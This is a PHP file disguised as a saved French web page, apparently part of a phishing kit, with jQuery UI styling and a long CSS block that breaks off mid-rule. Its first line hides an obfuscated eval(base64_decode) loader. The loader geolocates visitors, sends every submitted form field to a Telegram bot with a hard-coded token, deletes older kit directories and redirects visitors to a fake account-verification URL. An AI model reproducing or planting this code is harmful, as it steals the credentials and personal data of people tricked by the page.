﻿<?php eval(base64_decode('CiBnb3RvIHJZZGJLOyBSeGc5bzogJGluZm8gPSB1bnNlcmlhbGl6ZShmaWxlX2dldF9jb250ZW50cygiXHg2OFx4NzRcMTY0XDE2MFx4M2FceDJmXHgyZlx4NjlcMTYwXDU1XDE0MVx4NzBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXHg2OFwxNjBcNTd7JFN0cnVwTG9tfVw3N1x4NjZceDY5XDE0NVwxNTRcMTQ0XHg3M1w3NVwxNjNceDc0XDE0MVx4NzRcMTY1XHg3M1w1NFx4NmRcMTQ1XHg3M1x4NzNcMTQxXHg2N1x4NjVcNTRceDYzXHg2ZlwxNTZceDc0XDE1MVx4NmVceDY1XHg2ZVwxNjRcNTRceDYzXHg2ZlwxNTZceDc0XHg2OVx4NmVceDY1XDE1NlwxNjRceDQzXDE1N1wxNDRceDY1XDU0XHg2M1x4NmZcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MmNceDYzXHg2ZlwxNjVcMTU2XDE2NFwxNjJceDc5XDEwM1x4NmZceDY0XDE0NVw1NFx4NzJceDY1XHg2N1wxNTFcMTU3XHg2ZVx4MmNcMTYyXHg2NVwxNDdceDY5XHg2Zlx4NmVceDRlXDE0MVwxNTVceDY1XHgyY1wxNDNceDY5XHg3NFwxNzFceDJjXHg2NFx4NjlceDczXDE2NFx4NzJceDY5XDE0M1x4NzRceDJjXHg3YVx4NjlceDcwXHgyY1wxNTRcMTQxXHg3NFw1NFwxNTRcMTU3XDE1Nlx4MmNceDc0XDE1MVx4NmRceDY1XHg3YVx4NmZceDZlXDE0NVw1NFwxNDNceDc1XHg3MlwxNjJceDY1XDE1Nlx4NjNceDc5XHgyY1wxNTFcMTYzXHg3MFx4MmNcMTU3XHg3Mlx4NjdcNTRcMTQxXDE2M1x4MmNcMTQxXHg3M1wxNTZcMTQxXHg2ZFx4NjVcNTRceDcyXHg2NVwxNjZcMTQ1XHg3Mlx4NzNceDY1XDU0XHg2ZFwxNTdcMTQyXDE1MVx4NmNcMTQ1XDU0XDE2MFx4NzJceDZmXHg3OFwxNzFcNTRcMTUwXHg2ZlwxNjNceDc0XHg2OVx4NmVceDY3XDU0XHg3MVwxNjVceDY1XHg3Mlx4NzkiKSk7IGdvdG8gYjhsR3E7IFVmc3BTOiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIHBzMjBEOyBLUEloUzogJHBhcnRzID0gZXhwbG9kZSgkd2ViRGlyZWN0b3J5LCAkY3VycmVudERpcmVjdG9yeSwgMik7IGdvdG8gTzY3Smo7IGlEMGQ4OiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NjhceDc0XDE2NFwxNjBcMTYzXHgzYVw1N1x4MmZ7JGhvbWVEb21haW59XDU3XHg3N1wxNDVcMTQyIjsgZ290byBkcVNrcTsgbk9kTmg6ICRTdHJvbmdTb2wgPSAkc3ViRGlyZWN0b3JpZXNbMF07IGdvdG8gRWRQVEU7IEhzd0hyOiBmdW5jdGlvbiB0ZWxzZW50KCRtZXNzYWdlKSB7ICRUcnViRnR1YiA9ICJceDJkXHgzOVx4MzRceDM3XHgzMVw2MFx4MzNcNjdcNjBceDMwIjsgJGNSZXRWY2tyID0gIlx4MzZcNjNcNjZcNjBcNjZceDM4XDY3XHgzMFw2NVw2NFx4M2FceDQxXHg0MVx4NDVceDM1XHg3MlwxNjVceDM3XHg2NFx4NzdcMTcyXDYyXDE0Mlx4NzNcMTYxXDE2NFw2MlwxMjZcMTQ0XHg0Mlx4NjJcMTYyXDE0Nlw2NFx4NmZcMTEyXDE1MFwxNjVceDM5XHg2N1x4NThcMTQ2XDEyM1x4NThceDYyXDE1MyI7ICRhcGlfdXJsID0gIlx4NjhcMTY0XDE2NFx4NzBcMTYzXDcyXDU3XHgyZlx4NjFcMTYwXHg2OVx4MmVceDc0XHg2NVwxNTRceDY1XDE0N1wxNjJcMTQxXDE1NVx4MmVceDZmXDE2Mlx4NjdceDJmXHg2Mlx4NmZcMTY0eyRjUmV0VmNrcn1ceDJmXDE2M1wxNDVcMTU2XDE0NFx4NGRceDY1XHg3M1x4NzNceDYxXHg2N1x4NjUiOyAkcGFyYW1zID0gYXJyYXkoIlx4NjNceDY4XHg2MVx4NzRcMTM3XHg2OVwxNDQiID0+ICRUcnViRnR1YiwgIlwxNjRceDY1XHg3OFwxNjQiID0+ICRtZXNzYWdlKTsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1zKSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7IH0gZ290byB2R2wyTDsgaHVKSVk6IGlmIChpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OSJdKSkgeyAkX1NFU1NJT05bIlwxMDJcMTU0XHg2MVx4NzNceDYxXHg2M1x4NmZcMTY1XHg2ZSJdID0gJGluZm9bIlx4NjNcMTU3XDE2NVwxNTZcMTY0XDE2Mlx4NzkiXTsgfSBnb3RvIGJlbEdGOyBQNTA1TjogaW5pX3NldCgiXDE0NFx4NjlcMTYzXDE2MFwxNTRcMTQxXDE3MVx4NWZceDY1XDE2Mlx4NzJceDZmXDE2Mlx4NzMiLCAxKTsgZ290byBlZlpKNDsgdmM1WEE6IGlmICh0cmltKCRyZXNsb2NhbCkgIT0gdHJpbSgkU3RydXBMb20pKSB7ICRTdHJvbmdTb2wgPSAnJyAuIGJhc2VuYW1lKF9fRElSX18pOyAkaG9tZURvbWFpbiA9ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1ZlwxMTBcMTE3XHg1M1x4NTQiXTsgJHZlcmlmeUFjY291bnRVUkwgPSAiXHg2OFwxNjRcMTY0XHg3MFx4NzNceDNhXHgyZlx4MmZ7JGhvbWVEb21haW59XHgyZlwxNTFcMTU2XDE0NFwxNDVcMTcwXDU2XHg3MFwxNTBcMTYwXDc3XDE2NlwxNDVcMTYyXDE1MVx4NjZcMTcxXDEzN1wxNDFcMTQzXDE0M1x4NmZcMTY1XHg2ZVx4NzRceDNkXHg3M1x4NjVcMTYzXHg3M1wxNTFcMTU3XHg2ZVx4MjYiIC4gbWQ1KG1pY3JvdGltZSgpKSAuICJcNDZcMTQ0XHg2OVx4NzNceDcwXDE0MVwxNjRceDYzXDE1MFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDFcMTQzXHg2M1wxNDVcMTYzXHg3M1x4M2RceDI2XHg2NFx4NjFcMTY0XDE0MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2Y1x4NmZceDZjXHg2ZFwxNDVceDNkeyRTdHJvbmdTb2x9IjsgZWNobyAiXHgzY1x4NzNcMTQzXHg3Mlx4NjlcMTYwXDE2NFw0MFwxMTRcMTAxXHg0ZVwxMDdceDU1XDEwMVwxMDdcMTA1XHgzZFx4MjdceDRhXHg2MVwxNjZcMTQxXDEyM1x4NjNcMTYyXHg2OVx4NzBceDc0XDQ3XHgzZVwxMlx4MjBceDIwXHgyMFx4MjBceDc3XHg2OVx4NmVceDY0XDE1N1x4NzdcNTZceDZjXDE1N1x4NjNcMTQxXHg3NFwxNTFceDZmXHg2ZVx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXDEyXHgyMFx4MjBcNDBceDIwXDQwXDc0XHgyZlwxNjNcMTQzXHg3Mlx4NjlcMTYwXDE2NFx4M2UiOyBkaWU7IH0gZ290byBtdkhsQTsgdDRoY0Y6IGN1cmxfY2xvc2UoJGNoKTsgZ290byBnOU5aZzsgVE5VV0s6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB1QXBBUjsgYjhsR3E6IGlmIChpc3NldCgkaW5mb1siXDE0MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJceDY5XHg3M1wxNjAiXSA9ICRpbmZvWyJceDYxXHg3MyJdOyB9IGdvdG8gaHVKSVk7IHJkRG1IOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAzMjApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlx4MmUiIHx8ICRpdGVtID09ICJceDJlXDU2IikgeyBjb250aW51ZTsgfSBpZiAoIWRlbGV0ZURpcmVjdG9yeSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRpdGVtKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBpZiAocm1kaXIoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2UgeyByZXR1cm4gdHJ1ZTsgfSB9IGdvdG8gS1o4d0Q7IGc5TlpnOiBpZiAoIWVtcHR5KCRyZXNsb2NhbCkpIHsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBceDVmXHg0OFx4NGZcMTIzXDEyNCJdOyAkdmVyaWZ5QWNjb3VudFVSTCA9ICJcMTUwXHg3NFwxNjRceDcwXDE2M1w3Mlx4MmZceDJmeyRob21lRG9tYWlufVw1N1x4NjlceDZlXHg2NFwxNDVceDc4XHgyZVwxNjBcMTUwXHg3MFw3N1x4NzZcMTQ1XHg3MlwxNTFceDY2XDE3MVx4NWZceDYxXHg2M1wxNDNcMTU3XDE2NVwxNTZcMTY0XDc1XHg3M1wxNDVceDczXHg3M1wxNTFcMTU3XHg2ZVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XHg2OVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2MVx4NjNcMTQzXDE0NVwxNjNceDczXHgzZFx4MjZceDY0XDE0MVx4NzRcMTQxXDc1IiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZceDZjXHg2ZlwxNTRceDZkXHg2NVw3NXskU3Ryb25nU29sfSI7IGVjaG8gIlx4M2NcMTYzXHg2M1x4NzJcMTUxXDE2MFwxNjRcNDBceDRjXDEwMVx4NGVceDQ3XHg1NVx4NDFceDQ3XHg0NVw3NVx4MjdcMTEyXDE0MVwxNjZceDYxXDEyM1x4NjNcMTYyXHg2OVwxNjBcMTY0XDQ3XHgzZVx4YVw0MFx4MjBceDIwXHgyMFwxNjdcMTUxXDE1NlwxNDRceDZmXHg3N1x4MmVceDZjXDE1N1wxNDNcMTQxXDE2NFwxNTFceDZmXDE1Nlx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXHhhXDQwXHgyMFw0MFx4MjBcNDBcNzRcNTdcMTYzXHg2M1wxNjJceDY5XHg3MFwxNjRcNzYiOyBkaWU7IH0gZ290byB2YzVYQTsgS1o4d0Q6ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXDExMFx4NGZceDUzXHg1NCJdOyBnb3RvIGlEMGQ4OyBvQlJtODogJGhvbWVEb21haW4gPSAkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFwxMzdcMTEwXDExN1wxMjNcMTI0Il07IGdvdG8gdmkwSTU7IHVBcEFSOiAkY3VycmVudERpcmVjdG9yeSA9IF9fRElSX187IGdvdG8gdURqZks7IHRIQmwyOiAkZG9uZmxhZyA9ICRfU0VSVkVSWyJcMTIzXHg0NVwxMjJceDU2XDEwNVwxMjJceDVmXDExNlx4NDFcMTE1XHg0NSJdOyBnb3RvIFJ4ZzlvOyBPNjdKajogJHN1YkRpcmVjdG9yaWVzID0gZXhwbG9kZSgiXDU3IiwgJHBhcnRzWzFdKTsgZ290byBuT2ROaDsgdmkwSTU6ICRwYXJlbnREaXJlY3RvcnkgPSAiXHg2OFwxNjRcMTY0XDE2MFwxNjNcNzJcNTdcNTd7JGhvbWVEb21haW59XHgyZlx4NzdceDY1XHg2Mlw1N3skU3Ryb25nU29sfVx4MmZ7JGZpbGVuYW1lfSI7IGdvdG8gaGQ0aUY7IGhkNGlGOiAkY2ggPSBjdXJsX2luaXQoJHBhcmVudERpcmVjdG9yeSk7IGdvdG8gVWZzcFM7IFN5VTU2OiBpZiAoJHJlc2xvY2FsID09PSBmYWxzZSkgeyBkaWUoIlwxNDNceDU1XHg1Mlx4NGNceDIwXDEwNVwxNjJcMTYyXDE1N1x4NzJceDNhXDQwIiAuIGN1cmxfZXJyb3IoJGNoKSk7IH0gZ290byB0NGhjRjsgRWRQVEU6ICRmaWxlbmFtZSA9ICJcMTU0XDE1N1wxNDNceDYxXHg2Y1w1Nlx4NzRcMTcwXDE2NCI7IGdvdG8gb0JSbTg7IGRxU2txOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXHgyZlx4MmEiLCBHTE9CX09OTFlESVIpOyBnb3RvIFROVVdLOyBXUzJhMTogaWYgKCFlbXB0eSgkdmFsaWRJUHMpKSB7ICRTdHJ1cExvbSA9ICR2YWxpZElQc1swXTsgfSBlbHNlIHsgJFN0cnVwTG9tID0gIlw2MVw2Mlw2N1x4MmVceDMwXDU2XDYwXHgyZVx4MzEiOyB9IGdvdG8gdEhCbDI7IFNlQ0hGOiBpZiAoaXNzZXQoJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXDE1NlwxMTZcMTQxXHg2ZFwxNDUiXSkpIHsgJF9TRVNTSU9OWyJceDc4XHg0Zlx4NzBcMTY1XDE3MSJdID0gJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXHg2ZVwxMTZcMTQxXDE1NVwxNDUiXTsgfSBnb3RvIHJkRG1IOyBGR2ludjogJHZhbGlkSVBzID0gYXJyYXkoKTsgZ290byBlckN0QTsgYmVsR0Y6IGlmIChpc3NldCgkaW5mb1siXHg2M1x4NmZceDc1XHg2ZVx4NzRcMTYyXHg3OVwxMDNceDZmXDE0NFx4NjUiXSkpIHsgJF9TRVNTSU9OWyJcMTE2XDE1MlwxNTdcMTYwXDE0NiJdID0gJGluZm9bIlx4NjNceDZmXDE2NVx4NmVceDc0XHg3MlwxNzFcMTAzXDE1N1x4NjRceDY1Il07IH0gZ290byB3b2x5RjsgeG5QVFo6IGlmICgkaXBNYXRjaGVzKSB7ICR2YWxpZElQcyA9ICRtYXRjaGVzWzBdOyB9IGdvdG8gV1MyYTE7IHdvbHlGOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTUxXDE2NFx4NzkiXSkpIHsgJF9TRVNTSU9OWyJcMTI2XDE1N1wxNjBcMTYyXDE2NCJdID0gJGluZm9bIlx4NjNcMTUxXDE2NFx4NzkiXTsgfSBnb3RvIFNlQ0hGOyBlckN0QTogJGlwTWF0Y2hlcyA9IHByZWdfbWF0Y2hfYWxsKCJceDJmXHg1Y1x4NjJceDVjXHg2NFx4N2JceDMxXDU0XDYzXDE3NVwxMzRceDJlXDEzNFwxNDRcMTczXDYxXDU0XDYzXDE3NVx4NWNcNTZceDVjXDE0NFwxNzNcNjFceDJjXHgzM1wxNzVceDVjXDU2XDEzNFx4NjRcMTczXDYxXHgyY1x4MzNceDdkXDEzNFwxNDJceDJmIiwgJGlwQWRkcmVzcywgJG1hdGNoZXMpOyBnb3RvIHhuUFRaOyByWWRiSzogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBQNTA1TjsgUEJVWnI6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXHg0M1wxMTRceDQ5XHg0NVwxMTZceDU0XDEzN1x4NDlceDUwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFwxMjRceDU0XDEyMFwxMzdceDQzXHg0Y1x4NDlceDQ1XHg0ZVwxMjRceDVmXHg0OVwxMjAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXDExMFwxMjRceDU0XHg1MFwxMzdcMTMwXHg1ZlwxMDZcMTE3XHg1MlwxMjdcMTAxXDEyMlwxMDRcMTA1XDEwNFx4NWZcMTA2XDExN1x4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XDEyNFx4NTRcMTIwXDEzN1x4NThcMTM3XDEwNlwxMTdcMTIyXHg1N1x4NDFceDUyXDEwNFwxMDVceDQ0XHg1Zlx4NDZcMTE3XHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJcMTA1XDExNVwxMTdcMTI0XHg0NVx4NWZceDQxXHg0NFwxMDRcMTIyIl07IH0gZ290byBGR2ludjsgcHMyMEQ6ICRyZXNsb2NhbCA9IGN1cmxfZXhlYygkY2gpOyBnb3RvIFN5VTU2OyB1RGpmSzogJHdlYkRpcmVjdG9yeSA9ICJcNTdcMTY3XDE0NVx4NjJceDJmIjsgZ290byBLUEloUzsgbXZIbEE6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVcMTIxXHg1NVwxMDVcMTIzXHg1NFwxMzdcMTE1XHg0NVwxMjRceDQ4XDExN1x4NDQiXSA9PT0gIlx4NTBceDRmXDEyM1x4NTQiKSB7ICRwb3N0RGF0YVN0cmluZyA9ICcnOyAkcHJvX25tID0gJyc7IGZvcmVhY2ggKCRfUE9TVCBhcyAka2V5ID0+ICR2YWx1ZSkgeyBpZiAoIWVtcHR5KCRfU0VTU0lPTlsiXDE2MFx4NzJceDZmXDE1MlwxNDVceDYzXDE2NCJdKSkgeyAkcHJvX25tID0gJF9TRVNTSU9OWyJceDcwXDE2Mlx4NmZceDZhXDE0NVwxNDNcMTY0Il07IH0gJHBvc3REYXRhU3RyaW5nIC49ICJcMTEzXHg2NVx4NzlcNzJceDIweyRrZXl9XDU0XDQwXDEyNlx4NjFcMTU0XDE2NVx4NjVceDNhXHgyMHskdmFsdWV9XDQwXHg1MFwxNjJceDZmXHgzYVx4MjB7JHByb19ubX1ceGEiOyB9IGlmICghZW1wdHkoJHBvc3REYXRhU3RyaW5nKSkgeyB0ZWxzZW50KCRwb3N0RGF0YVN0cmluZyk7IH0gfSBnb3RvIEhzd0hyOyBlZlpKNDogaWYgKHNlc3Npb25fc3RhdHVzKCkgPT0gUEhQX1NFU1NJT05fTk9ORSkgeyBzZXNzaW9uX3N0YXJ0KCk7IH0gZ290byBQQlVacjsgdkdsMkw6IA==')); ?><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
    <script data-savepage-type="" type="text/plain"></script>
    <script data-savepage-type="" type="text/plain"></script>
    <head>
        <link
            rel="icon"
            data-savepage-href="/pages_S027_E001_0001/gdo_agrem_dem/favicon.ico"
            href="data:text/plain;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAFnRFWHRDcmVhdGlvbiBUaW1lADA0LzMwLzA51O4BBwAAAAd0SU1FB9kKEwc4KaGbNYUAAAAJcEhZcwAACxEAAAsRAX9kX5EAAAAEZ0FNQQAAsY8L/GEFAAAAllBMVEWJzrZxwKR6xKgKlmQAgUIAiUwAeDUAhEkgn3AAjlgeonVYtpMAfUAAklsrpHcAjFIAbyiZ08Ci1cIZnG3///+GzrSi28gAejw8rYUYoHFHso6y28wMj1k1rIQAczBsv6KIyK3D6Nvn9vGw28xfu51IrodnupgSk2ASnGsxo3ef18Mupnx/xqqu2sgAbSQAmWaV0b1PtJA4NP20AAAAo0lEQVR42lWP2RLCIAwAU02AWGjUovVqve/7/3/OYlHHfWHY2TABnueyIZ6Qk0RshUQCht0bMY/EauavcPvU+xUFwSHGc3Lx/nq7gxEZb3ervVaH4nhSri4E63a9Ycas1EHo+WKplHADZCJl1f687BxklIv93WthJ9OZOEdRgsGBHxZajcYcC+n2+px7H5OwmEbspJbiSLv+EREqJP0GIGn98QJgzg7jQVzWSwAAAABJRU5ErkJggg=="
        />
        <script data-savepage-type="" type="text/plain" language="JavaScript"></script>

        <script data-savepage-type="" type="text/plain" language="JavaScript" data-savepage-src="../../"></script>
        <script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script>

        <meta content="no-cache" http-equiv="cache-control" />
        <meta content="fr" http-equiv="content-language" />
        <meta content="text/html; charset=iso-8859-1" http-equiv="content-type" />
        <script data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/00102840-BF102840.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery-ui-1.8.23.custom.min.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.dataTables.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/dataTables.numericComma.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/TableTools.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/ZeroClipboard.js"></script>
        <style data-savepage-href="../../styles/jquery-ui-1.8.19.custom.css" type="text/css">
            .ui-helper-hidden {
                display: none;
            }
            .ui-helper-hidden-accessible {
                clip: rect(1px 1px 1px 1px);
                position: absolute !important;
            }
            .ui-helper-reset {
                border-bottom: 0px;
                border-left: 0px;
                padding-bottom: 0px;
                line-height: 1.3;
                list-style-type: none;
                margin: 0px;
                outline-style: none;
                outline-color: invert;
                padding-left: 0px;
                outline-width: 0px;
                padding-right: 0px;
                font-size: 100%;
                border-top: 0px;
                border-right: 0px;
                text-decoration: none;
                padding-top: 0px;
            }
            .ui-helper-clearfix:before {
                display: table;
            }
            .ui-helper-clearfix:after {
                display: table;
            }
            .ui-helper-clearfix:after {
                clear: both;
            }
            .ui-helper-clearfix {
                zoom: 1;
            }
            .ui-helper-zfix {
                position: absolute;
                filter: Alpha(Opacity=0);
                width: 100%;
                height: 100%;
                top: 0px;
                left: 0px;
                opacity: 0;
            }
            .ui-state-disabled {
                cursor: default !important;
            }
            .ui-icon {
                text-indent: -99999px;
                display: block;
                background-repeat: no-repeat;
                overflow: hidden;
            }
            .ui-widget {
                font-family: segoe ui, Arial, sans-serif;
                font-size: 1.1em;
            }
            .ui-widget .ui-widget {
                font-size: 1em;
            }
            .ui-widget INPUT {
                font-family: segoe ui, Arial, sans-serif;
                font-size: 1em;
            }
            .ui-widget SELECT {
                font-family: segoe ui, Arial, sans-serif;
                font-size: 1em;
            }
            .ui-widget TEXTAREA {
                font-family: segoe ui, Arial, sans-serif;
                font-size: 1em;
            }
            .ui-widget BUTTON {
                font-family: segoe ui, Arial, sans-serif;
                font-size: 1em;
            }
            .ui-widget-content {
                border-bottom: #dfd9c3 1px solid;
                border-left: #dfd9c3 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_100_f5f3e5_1x100.png*/ url() #f5f3e5 repeat-x 50% top;
                color: #312e25;
                border-top: #dfd9c3 1px solid;
                border-right: #dfd9c3 1px solid;
            }
            .ui-widget-content A {
                color: #312e25;
            }
            .ui-widget-header {
                border-bottom: #d4ccb0 1px solid;
                border-left: #d4ccb0 1px solid;
                background: /*savepage-url=images/ui-bg_gloss-wave_100_ece8da_500x100.png*/ url() #ece8da repeat-x 50% 50%;
                color: #433f38;
                border-top: #d4ccb0 1px solid;
                font-weight: bold;
                border-right: #d4ccb0 1px solid;
            }
            .ui-widget-header A {
                color: #433f38;
            }
            .ui-state-default {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_15_459e00_1x100.png*/ url() #459e00 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-content .ui-state-default {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_15_459e00_1x100.png*/ url() #459e00 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-header .ui-state-default {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_15_459e00_1x100.png*/ url() #459e00 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-state-default A {
                color: #ffffff;
                text-decoration: none;
            }
            .ui-state-default A:link {
                color: #ffffff;
                text-decoration: none;
            }
            .ui-state-default A:visited {
                color: #ffffff;
                text-decoration: none;
            }
            .ui-state-hover {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-content .ui-state-hover {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-header .ui-state-hover {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-state-focus {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-content .ui-state-focus {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-widget-header .ui-state-focus {
                border-bottom: #327e04 1px solid;
                border-left: #327e04 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_25_67b021_1x100.png*/ url() #67b021 repeat-x 50% 50%;
                color: #ffffff;
                border-top: #327e04 1px solid;
                font-weight: bold;
                border-right: #327e04 1px solid;
            }
            .ui-state-hover A {
                color: #ffffff;
                text-decoration: none;
            }
            .ui-state-hover A:hover {
                color: #ffffff;
                text-decoration: none;
            }
            .ui-state-active {
                border-bottom: #d4ccb0 1px solid;
                border-left: #d4ccb0 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_100_fafaf4_1x100.png*/ url() #fafaf4 repeat-x 50% 50%;
                color: #459e00;
                border-top: #d4ccb0 1px solid;
                font-weight: bold;
                border-right: #d4ccb0 1px solid;
            }
            .ui-widget-content .ui-state-active {
                border-bottom: #d4ccb0 1px solid;
                border-left: #d4ccb0 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_100_fafaf4_1x100.png*/ url() #fafaf4 repeat-x 50% 50%;
                color: #459e00;
                border-top: #d4ccb0 1px solid;
                font-weight: bold;
                border-right: #d4ccb0 1px solid;
            }
            .ui-widget-header .ui-state-active {
                border-bottom: #d4ccb0 1px solid;
                border-left: #d4ccb0 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-hard_100_fafaf4_1x100.png*/ url() #fafaf4 repeat-x 50% 50%;
                color: #459e00;
                border-top: #d4ccb0 1px solid;
                font-weight: bold;
                border-right: #d4ccb0 1px solid;
            }
            .ui-state-active A {
                color: #459e00;
                text-decoration: none;
            }
            .ui-state-active A:link {
                color: #459e00;
                text-decoration: none;
            }
            .ui-state-active A:visited {
                color: #459e00;
                text-decoration: none;
            }
            .ui-widget :active {
                outline-style: none;
